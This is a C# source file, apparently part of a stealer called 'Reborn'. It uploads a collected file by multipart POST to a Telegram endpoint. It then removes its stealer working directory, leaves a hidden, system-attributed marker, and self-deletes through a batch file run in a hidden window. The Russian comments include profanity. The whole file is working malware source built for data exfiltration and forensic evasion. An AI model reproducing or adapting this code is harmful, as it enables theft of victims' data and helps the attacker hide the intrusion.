using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Authentication;

namespace Reborn
{
    class Sending
    {
        public static class SecurityProtocolTypeExtensions
        {
            public const SecurityProtocolType Tls12 = (SecurityProtocolType)SslProtocolsExtensions.Tls12;
            public const SecurityProtocolType Tls11 = (SecurityProtocolType)SslProtocolsExtensions.Tls11;
            public const SecurityProtocolType SystemDefault = (SecurityProtocolType)0;
        }
        public static class SslProtocolsExtensions
        {
            public const SslProtocols Tls12 = (SslProtocols)0x00000C00;
            public const SslProtocols Tls11 = (SslProtocols)0x00000300;
        }
        public static void POST(byte[] file, string filename, string contentType, string url)
        {

            try
            {
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolTypeExtensions.Tls11 | SecurityProtocolTypeExtensions.Tls12;
                 WebClient webClient = new WebClient
                 {
                     Proxy = null //Не используем
                 };
                
                 string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                 webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                 string @string = webClient.Encoding.GetString(file);
                 string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                 {
                
                     text,
                     filename,
                     contentType,
                     @string
                 });
                 byte[] bytes = webClient.Encoding.GetBytes(s);
                 webClient.UploadData(url, "POST", bytes);
            }
            catch (Exception e)
            {
                Console.WriteLine(e + "ВО ВРЕМЯ ОТПРАВКИ ТЕЛЕГРАМ ПОСЛАЛ ТЕБЯ НАХУЙ");

                //ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolTypeExtensions.Tls11 | SecurityProtocolTypeExtensions.Tls12;
                //using (var webClient = new WebClient())
                //{
                //    string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                //    webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                //    string @string = webClient.Encoding.GetString(file);
                //    string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                //    {
                //       text,
                //       filename,
                //       contentType,
                //       @string
                //    });
                //    byte[] bytes = webClient.Encoding.GetBytes(s);
                //    var proxy = new WebProxy(Config.ip, Config.port) // IP Proxy
                //    {
                //        Credentials = new NetworkCredential(Config.login, Config.password) // Логин и пароль Proxy
                //    };
                //    webClient.Proxy = proxy;
                //    webClient.UploadData(url, "POST", bytes);
                //    Finish();
                //}
                Console.ReadLine();
            }
           
           
        }
     
        public static void Finish()
        {
            Directory.CreateDirectory(Help.DirectoryBuild);
            File.Create(Help.DirectoryBuild + Config.ID);
            File.SetAttributes(Help.DirectoryBuild, FileAttributes.Hidden | FileAttributes.System);
            Directory.Delete(Help.StealerDir + "\\", true);
            AutoDelete();
        }
        public static void AutoDelete()
        {
            string batch = Path.GetTempPath() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off"); // скрываем консоль
                sw.WriteLine("ping -n 1 localhost > Nul"); // Задержка до выполнения следуюющих команд в секундах.
                sw.WriteLine("del /ah /q " + Help.PatchBuildName);
                sw.WriteLine("del" + Path.GetTempPath() + batch); // Сносим нахуй батник
            }
            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);
        }
    }
}
